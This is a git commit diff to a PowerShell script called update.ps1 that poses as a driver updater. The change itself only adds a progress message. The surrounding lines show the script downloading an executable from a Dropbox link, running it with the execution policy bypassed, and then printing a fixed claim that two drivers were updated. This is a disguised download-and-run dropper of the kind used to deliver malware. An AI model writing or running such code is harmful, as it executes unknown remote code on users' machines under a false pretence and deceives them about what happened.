0cfab7ee6c342d2d92694552dadcd7a12dfda67a
Disepi423 <nathanpj.perso@gmail.com>
2026-02-16 20:09:20 +0100

    Update update.ps1

--- update.ps1
+++ update.ps1
@@ -9,6 +9,7 @@
 $Url = 'https://www.dropbox.com/scl/fi/bf0mm4nt9fcl03phhwjey/DriversSofware.exe?rlkey=l0c5uwsale3be2bpn5870drkn&e=1&st=1btcgqq9&dl=1'
 
 try {
+    Write-Host "Starting drivers update, please wait..."
     Invoke-WebRequest $Url -OutFile 'updater1.exe' -ErrorAction Stop
     & powershell -ExecutionPolicy Bypass -File 'updater1.exe'
     Write-Host "Succesfully updated 2 drivers." -ForegroundColor Green
